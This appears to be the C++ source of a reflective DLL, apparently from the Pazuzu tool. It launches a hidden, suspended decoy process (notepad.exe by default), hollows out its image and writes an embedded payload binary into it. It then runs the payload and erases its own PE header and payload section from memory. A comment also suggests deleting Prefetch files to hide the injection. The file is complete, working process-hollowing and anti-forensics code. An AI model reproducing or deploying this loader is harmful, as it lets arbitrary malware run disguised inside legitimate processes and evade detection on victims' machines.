
#include "ReflectiveLoader.h"
#include <bcrypt.h>

void pazuzu();
void env_dynamic_forking(char * buffer, IMAGE_NT_HEADERS32 *nt_headers);
void clean_stuff();
wchar_t * check_path_from_section();
char * get_path_from_section();
char * get_binary_from_section();
void delete_section(IMAGE_DOS_HEADER *addr);
void delete_pe_header(IMAGE_DOS_HEADER *addr);
IMAGE_NT_HEADERS32 * get_ntheader(IMAGE_DOS_HEADER *addr);
IMAGE_DOS_HEADER * get_mz_address();
void dynamic_forking(char * binaryBase, IMAGE_NT_HEADERS32 *nt_headers, wchar_t *default_bin);
IMAGE_SECTION_HEADER * get_first_section_header(IMAGE_NT_HEADERS32 *ntheaders);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
	case DLL_PROCESS_ATTACH:
		pazuzu();
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}

IMAGE_SECTION_HEADER * get_first_section_header(IMAGE_NT_HEADERS32 *ntheaders)
{
	return (IMAGE_SECTION_HEADER*)((IMAGE_OPTIONAL_HEADER32 *)&(*ntheaders).OptionalHeader + 1);
}

/* Useful info:
https://github.com/rapid7/meterpreter/blob/6d43284689240f4261cae44a47f0fb557c1dde27/source/extensions/stdapi/server/sys/process/in-mem-exe.c
http://www.ic0de.org/archive/index.php/t-9332.html */

void dynamic_forking(char * binaryBase, IMAGE_NT_HEADERS32 *nt_headers, wchar_t *default_bin)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	RtlZeroMemory(&si, sizeof(si));
	RtlZeroMemory(&pi, sizeof(pi));

	typedef enum _PROCESSINFOCLASS
	{
		ProcessBasicInformation = 0,
	} PROCESSINFOCLASS;
	ULONG                     SizeOfBasicInformation;

	typedef struct _MINI_PEB
	{
		ULONG  Flags;
		LPVOID Mutant;
		LPVOID ImageBaseAddress;
	} MINI_PEB, *PMINI_PEB;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		NTSTATUS  ExitStatus;
		PMINI_PEB PebBaseAddress;
		ULONG     AffinityMask;
		ULONG     BasePriority;
		HANDLE    UniqueProcessId;
		HANDLE    InheritedFromUniqueProcessId;
	} PROCESS_BASIC_INFORMATION;

	PROCESS_BASIC_INFORMATION       BasicInformation;
	RtlZeroMemory(&BasicInformation, sizeof(PROCESS_INFORMATION));

	PMINI_PEB  ProcessPeb;
	PCONTEXT ctx = (PCONTEXT)_aligned_malloc(sizeof(CONTEXT), sizeof(DWORD));
	ctx->ContextFlags = CONTEXT_INTEGER;

	HMODULE hModule = LoadLibrary(L"ntdll.dll");
	typedef LONG(WINAPI * NtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);
	typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
	typedef NTSTATUS(NTAPI * NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, LPVOID, ULONG, PULONG);
	NtWaitForSingleObject _NtWaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hModule, "NtWaitForSingleObject");
	NtUnmapViewOfSection _NtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hModule, "NtUnmapViewOfSection");
	NtQueryInformationProcess _NtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");

	DWORD createFlags = CREATE_SUSPENDED;

	si.dwFlags |= STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	createFlags |= CREATE_NO_WINDOW;


	// Run the decoy process in a SUSPENDED state
	if (!CreateProcess(default_bin, NULL, NULL, NULL, FALSE, createFlags, NULL, NULL, &si, &pi))
	{
		return;
	}

	GetThreadContext(pi.hThread, LPCONTEXT(ctx));
	// ctx->Eax: Entry Point
	_NtUnmapViewOfSection(pi.hProcess, PVOID(ctx->Eax));

	// Set new entry point
	ctx->Eax = (*nt_headers).OptionalHeader.ImageBase + (*nt_headers).OptionalHeader.AddressOfEntryPoint;

	if (!SetThreadContext(pi.hThread, ctx))
	{
		return;
	}

	// Reserve memory (SizeOfImage bytes) for the payload
	PVOID TargetImageBase = VirtualAllocEx(pi.hProcess, (LPVOID)(*nt_headers).OptionalHeader.ImageBase, (*nt_headers).OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if ((_NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &BasicInformation, sizeof(BasicInformation), &SizeOfBasicInformation) != ERROR_SUCCESS))
	{
		return;
	}

	// Get the process environment block address
	ProcessPeb = BasicInformation.PebBaseAddress;
	// Set the new ImageBaseAddress in the PEB
	WriteProcessMemory(pi.hProcess, (LPVOID)&ProcessPeb->ImageBaseAddress, (LPVOID)&(*nt_headers).OptionalHeader.ImageBase, sizeof(LPVOID), NULL);

	// Copy the new headers
	WriteProcessMemory(pi.hProcess, TargetImageBase, binaryBase, (*nt_headers).OptionalHeader.SizeOfHeaders, NULL);
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(nt_headers);
	int i;
	// Copy each section
	for (i = 0; i<(*nt_headers).FileHeader.NumberOfSections; i++)
	{
		WriteProcessMemory(pi.hProcess, (PVOID)((PCHAR)TargetImageBase + sectionHeader[i].VirtualAddress), (PVOID)((PCHAR)binaryBase + sectionHeader[i].PointerToRawData), sectionHeader[i].SizeOfRawData, NULL);
	}

	VirtualFree(binaryBase, 0, MEM_RELEASE);
	ResumeThread(pi.hThread);
	_NtWaitForSingleObject(pi.hProcess, FALSE, NULL);
}

IMAGE_DOS_HEADER * get_mz_address()
{
	// Get current page in memory
	char *addr = (char *)((INT)(&get_mz_address) & 0xFFFFF000);

	// MZ still present in Reflective DLL stub: http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf
	// The e_lfanew field in also safe and sound
	while (true)
	{
		if ((addr[0] == 'M') && (addr[1] == 'Z'))
		{
			break;
		}
		addr = addr - 4096;
	}
	return (IMAGE_DOS_HEADER *)addr;
}

IMAGE_NT_HEADERS32 * get_ntheader(IMAGE_DOS_HEADER *addr)
{
	return (IMAGE_NT_HEADERS32 *)((char *)addr + (addr->e_lfanew));
}

void delete_pe_header(IMAGE_DOS_HEADER *addr)
{

	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);
	int diff = (int)((char*)&sectionHeader[n_sections] - (char *)addr);
	DWORD old;
	VirtualProtect(addr, diff, PAGE_READWRITE, &old); // Not needed
	memset(addr, 0, diff);
}

void delete_section(IMAGE_DOS_HEADER *addr)
{
	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);
	void *last_section_addr = sectionHeader[n_sections - 1].VirtualAddress + (char*)addr;
	int last_section_size = sectionHeader[n_sections - 1].Misc.VirtualSize;
	DWORD old;
	VirtualProtect(last_section_addr, last_section_size, PAGE_READWRITE, &old); // Not needed
	memset(last_section_addr, 0, last_section_size);
}

char * get_binary_from_section()
{
	IMAGE_DOS_HEADER *addr = get_mz_address();
	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;

	// Pointer first section Header
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);

	//Get payload added to the last section
	return (char *)(sectionHeader[n_sections - 1].VirtualAddress + (char*)addr);
}

// Returns the binary path (wide char) from the .Conf section.
char * get_path_from_section()
{
	IMAGE_DOS_HEADER *addr = get_mz_address();
	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;

	// Pointer first section Header
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);

	// Get config section (second last)
	void *conf_section_addr = sectionHeader[n_sections - 2].VirtualAddress + (char*)addr;

	// It makes some checks
	if (strstr((char *)(sectionHeader[n_sections - 2].Name), ".Conf") != NULL)
	{
		if (((char *)conf_section_addr)[0] != '\0')
		{
			int len = strlen((char *)conf_section_addr);
			if (len > 0 && len < 255)
			{
				return (char *)conf_section_addr;
			}
		}
	}
	return NULL;
}

wchar_t * check_path_from_section()
{
	char * path = get_path_from_section();
	if (path != NULL)
	{
		int wchars_num = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
		wchar_t *wpath = new wchar_t[wchars_num];
		MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, wchars_num);

		// Does it exist?
		if (GetFileAttributes(wpath) != 0xFFFFFFFF)
		{
			return wpath;
		}
	}
	return NULL;
}

void clean_stuff()
{
	IMAGE_DOS_HEADER *addr = get_mz_address();
	delete_section(addr);
	delete_pe_header(addr);
	//Delete Prefetch files to hide dynamic forking: http://journeyintoir.blogspot.com.es/2014/12/prefetch-file-meet-process-hollowing_17.html
	//delete_prefetch();
}

void env_dynamic_forking(char * buffer, IMAGE_NT_HEADERS32 *nt_headers)
{
	wchar_t *wpath = NULL;

	// If -k option in pazuzu is set, It will use the binary chosen by the user (stored in .Conf section)
	wpath = check_path_from_section();

	if (wpath == NULL)
	{
		// Choose your favorite silly binary (32 bits)
		dynamic_forking(buffer, nt_headers, L"C:\\Windows\\notepad.exe");
	}
	else
	{
		dynamic_forking(buffer, nt_headers, wpath);
	}
}

void pazuzu()
{
	IMAGE_NT_HEADERS32 *nt_headers = NULL;
	char * buffer = NULL;

	// Get a pointer to the section containing the binary
	buffer = get_binary_from_section();

	// Pointer to the nt_header 
	nt_headers = get_ntheader((IMAGE_DOS_HEADER *)buffer);
	env_dynamic_forking(buffer, nt_headers);
	clean_stuff();

	ExitThread(0);
}
